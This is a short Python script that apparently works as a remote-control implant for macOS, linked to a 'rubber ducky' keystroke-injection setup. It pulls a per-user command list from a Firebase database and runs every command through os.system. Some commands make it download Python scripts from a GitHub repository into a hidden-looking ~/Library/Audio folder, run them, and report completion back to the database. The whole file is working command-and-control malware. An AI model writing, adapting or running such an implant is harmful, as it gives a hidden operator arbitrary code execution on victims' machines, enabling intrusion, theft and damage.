import requests
import json
import os

PYTHON_PREFIX = "/"

USER = os.environ["USER"]
FIREBASE_URL = "https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app"
GITHUB_URL = "https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main"


rq = requests.get(f"{FIREBASE_URL}/users.json")
userData = rq.json()[USER]

if userData['executed'] == True: exit(0)

for cmd in userData['commands']:
    if not cmd.startswith(PYTHON_PREFIX): 
        os.system(cmd)
        continue

    args = cmd[1:].split(" ")
    try:
        os.system(f"curl -H \"Cache-Control: no-cache\" {GITHUB_URL}/commands/{args[0]}.py -o ~/Library/Audio/{args[0]}.py")
        os.system(f"python3 ~/Library/Audio/{args[0]}.py {' '.join(args[1:])}")
    except:
        pass

requests.put(f"{FIREBASE_URL}/users/{USER}/executed.json", data="true")
